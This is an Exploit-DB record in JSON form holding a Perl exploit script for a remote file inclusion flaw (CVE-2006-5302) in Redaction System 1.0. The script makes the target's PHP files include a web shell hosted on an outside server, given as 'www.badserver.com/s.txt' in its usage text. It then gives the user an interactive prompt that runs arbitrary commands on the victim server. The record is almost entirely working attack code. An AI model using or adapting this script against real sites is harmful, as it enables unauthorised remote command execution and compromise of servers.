{
  "id": "2534",
  "title": "Redaction System 1.0 - &#039;lang_prefix&#039; Remote File Inclusion",
  "cve": "CVE-2006-5302",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\n\r\n$target = @ARGV[0];\r\n$shellsite = @ARGV[1];\r\n$shellcmd = @ARGV[2];\r\n$fileno = @ARGV[3];\r\n\r\nif(!$target || !$shellsite)\r\n{\r\n    usage();\r\n}\r\n\r\nheader();\r\n\r\nif ($fileno eq 1)\r\n{\r\n    $file = \" conn.php?lang_prefix=\";\r\n}\r\nelsif ($fileno eq 2)\r\n{\r\n    $file = \"index.php?lang=\";\r\n}\r\nelsif ($fileno eq 3)\r\n{\r\n    $file = \"sesscheck.php?lang_prefix=\";\r\n}\r\nelsif ($fileno eq 4)\r\n{\r\n    $file = \"wap/conn.php?lang_prefix=\";\r\n}\r\nelsif ($fileno eq 5)\r\n{\r\n    $file = \"wap/sesscheck.php?lang_prefix=\";\r\n}\r\nelse\r\n{\r\n    $file = \"conn.php?lang_prefix=\";\r\n}\r\n\r\nwhile()\r\n{\r\n    print \"[cmd]\\$\";\r\n    while (<STDIN>)\r\n    {\r\n        $cmd = $_;\r\n        chomp($cmd);\r\nprint $target.'/'.$file.'='.$shellsite.'?&'.$shellcmd.'='.$cmd;\r\n        $xpl = LWP::UserAgent->new() or die;\r\n        $req = HTTP::Request->new(GET=>$target.'/'.$file.'='.$shellsite.'?&'.$shellcmd.'='.$cmd) or die(\"\\n\\n Failed to connect.\");\r\n        $res = $xpl->request($req);\r\n        $rp = $res->content;\r\n        $rp =~ tr/[\\n]/[&#234;]/;\r\nprint $rp;\r\n        if (!cmd)\r\n        {\r\n            print \"\\nEnter command: \\n\";\r\n            $rp = \"\";\r\n        }\r\n        elsif ($rp=~/failed to open stream: HTTP request failed!/ || $rp=~/: Cannot execute a blank command in <b>/)\r\n        {\r\n            print \"\\nUnable to connect to Shellsite, or invalid command variable\\n\";\r\n            exit;\r\n        }\r\n        elsif ($rp=~/^<br.\\/>.<b>Warning/)\r\n        {\r\n            print \"\\nInvalid Command\\n\\n\";\r\n            exit;\r\n        }\r\n       \r\n        if ($rp=~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n        {\r\n            $final = $1;\r\n            $final=~ tr/[&#234;]/[\\n]/;\r\n            print \"\\n$final\\n\";\r\n        }\r\n        else\r\n        {\r\n            print \"[cmd]\\$ \";\r\n        }\r\n    }\r\n}\r\n\r\nsub header()\r\n{\r\n    print q\r\n    {\r\n######################################################################\r\n       Redaction System 1.0000 - Remote Include Exploit\r\n        Vulnerability discovered and exploit by r0ut3r\r\n               writ3r@gmail.com\r\n          Special thanks to Warpboy's perl tutorial\r\n             http://milw0rm.com/papers/85\r\n######################################################################\r\n    };\r\n}\r\n\r\nsub usage()\r\n{\r\nheader();\r\n    print q\r\n    {\r\n######################################################################\r\nUsage:\r\nperl rs_xpl.pl <Target website> <Shell Location> <CMD Variable> <No>\r\n<Target Website> - Path to target eg: www.rsvuln.target.com\r\n<Shell Location> - Path to shell eg: www.badserver.com/s.txt\r\n<CMD Variable> - Shell command variable name eg: cmd\r\n<No> - File number, corresponding to:\r\n1: conn.php\r\n2: index.php\r\n3: sesscheck.php\r\n4: wap/conn.php\r\n5: wap/sesscheck.php\r\n######################################################################\r\n    };\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-10-12]",
  "url": "https://www.exploit-db.com/exploits/2534"
}